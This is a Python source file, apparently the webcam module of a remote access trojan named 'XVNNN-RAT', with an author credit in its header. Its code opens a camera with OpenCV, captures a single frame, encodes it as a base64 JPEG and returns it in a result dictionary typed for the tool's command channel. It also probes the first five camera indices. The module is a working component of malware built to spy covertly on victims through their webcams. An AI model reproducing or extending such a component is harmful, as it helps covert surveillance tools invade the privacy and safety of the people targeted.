"""
Webcam module for XVNNN-RAT
Author: Ali Zafar (alizafarbati@gmail.com)
"""

import logging

logger = logging.getLogger(__name__)


class WebcamModule:
    """Webcam capture module (Optional - requires opencv-python)"""

    def __init__(self):
        self.name = "webcam"
        self.available = False
        self.cv2 = None

        # Try to import opencv
        try:
            import cv2

            self.cv2 = cv2
            self.available = True
            logger.info("Webcam module initialized (OpenCV available)")
        except ImportError:
            logger.warning(
                "Webcam module: opencv-python not installed. Webcam features disabled."
            )

    def capture(self, camera_id=0, filename=None):
        """Capture image from webcam"""
        if not self.available:
            return {"type": "webcam", "error": "OpenCV not installed"}

        try:
            cap = self.cv2.VideoCapture(camera_id)
            if not cap.isOpened():
                return {"type": "webcam", "error": "Could not open camera"}

            ret, frame = cap.read()
            cap.release()

            if not ret:
                return {"type": "webcam", "error": "Failed to capture frame"}

            # Encode image as JPEG
            success, encoded_image = self.cv2.imencode(".jpg", frame)
            if not success:
                return {"type": "webcam", "error": "Failed to encode image"}

            import base64

            image_data = base64.b64encode(encoded_image.tobytes()).decode("utf-8")

            return {
                "type": "webcam",
                "image_data": image_data,
                "format": "jpg",
                "width": frame.shape[1],
                "height": frame.shape[0],
            }
        except Exception as e:
            logger.error(f"Webcam capture error: {e}")
            return {"type": "webcam", "error": str(e)}

    def list_cameras(self):
        """List available cameras"""
        if not self.available:
            return {"type": "webcam", "cameras": []}

        cameras = []
        for i in range(5):  # Check first 5 indices
            cap = self.cv2.VideoCapture(i)
            if cap.isOpened():
                cameras.append(i)
                cap.release()

        return {"type": "webcam", "cameras": cameras}
